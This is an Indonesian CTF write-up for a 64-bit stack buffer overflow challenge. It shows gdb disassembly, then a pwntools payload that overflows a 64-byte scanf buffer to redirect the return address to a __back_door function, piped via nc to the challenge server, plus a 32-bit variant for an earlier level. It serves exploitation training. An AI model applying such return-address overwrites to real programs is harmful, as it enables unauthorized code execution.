# Buffer 2 \(480\)

> `nc 103.200.4.156 8361`

###### POC

Sebenernya sama saja dengan soal buffer yang pertama akan tetapi, di soal ini disuruh untuk loncat ke address function **\_\_back\_door**

```
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0000000000400761 <+0>:	push   rbp
   0x0000000000400762 <+1>:	mov    rbp,rsp
   0x0000000000400765 <+4>:	mov    rax,QWORD PTR [rip+0x2008e4]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x000000000040076c <+11>:	mov    ecx,0x0
   0x0000000000400771 <+16>:	mov    edx,0x2
   0x0000000000400776 <+21>:	mov    esi,0x0
   0x000000000040077b <+26>:	mov    rdi,rax
   0x000000000040077e <+29>:	call   0x400600 <setvbuf@plt>
   0x0000000000400783 <+34>:	mov    eax,0x0
   0x0000000000400788 <+39>:	call   0x40071a <buf2>
   0x000000000040078d <+44>:	mov    eax,0x0
   0x0000000000400792 <+49>:	pop    rbp
   0x0000000000400793 <+50>:	ret    
End of assembler dump.
```

```
gdb-peda$ pdisass buf2
Dump of assembler code for function buf2:
   0x000000000040071a <+0>:	push   rbp
   0x000000000040071b <+1>:	mov    rbp,rsp
   0x000000000040071e <+4>:	sub    rsp,0x40
   0x0000000000400722 <+8>:	lea    rdi,[rip+0x10d]        # 0x400836
   0x0000000000400729 <+15>:	call   0x4005d0 <puts@plt>
   0x000000000040072e <+20>:	lea    rax,[rbp-0x40]
   0x0000000000400732 <+24>:	mov    rsi,rax
   0x0000000000400735 <+27>:	lea    rdi,[rip+0x10d]        # 0x400849
   0x000000000040073c <+34>:	mov    eax,0x0
   0x0000000000400741 <+39>:	call   0x400610 <__isoc99_scanf@plt>
   0x0000000000400746 <+44>:	lea    rax,[rbp-0x40]
   0x000000000040074a <+48>:	mov    rsi,rax
   0x000000000040074d <+51>:	lea    rdi,[rip+0xf8]        # 0x40084c
   0x0000000000400754 <+58>:	mov    eax,0x0
   0x0000000000400759 <+63>:	call   0x4005f0 <printf@plt>
   0x000000000040075e <+68>:	nop
   0x000000000040075f <+69>:	leave  
   0x0000000000400760 <+70>:	ret    
End of assembler dump.
```

Dari address **0x000000000040072e** program akan mengalokasikan 0x40 atau 64bytes, tujuan kita disini iyalah men-overwrite return addressnya, jadi payloadnya...

```py
from pwn import *

backdoor = p64(0x0000000000400702)
print "A"*64 + "B"*8 + backdoor
```

```
>> python payload.py | nc {ip} {port}
```

Sebenarnya dari buffer yang pertama dapat menggunakan bantuan pwntools juga, jadi begini..

```py
from pwn import *

print "A"*16 + p32(0xdeadbeef)
```

Perbedaannya hanya pada fungsi p32 dan p64, karna buffer pertama file ELF 32-bit dan buffer kedua file ELF 64-bit

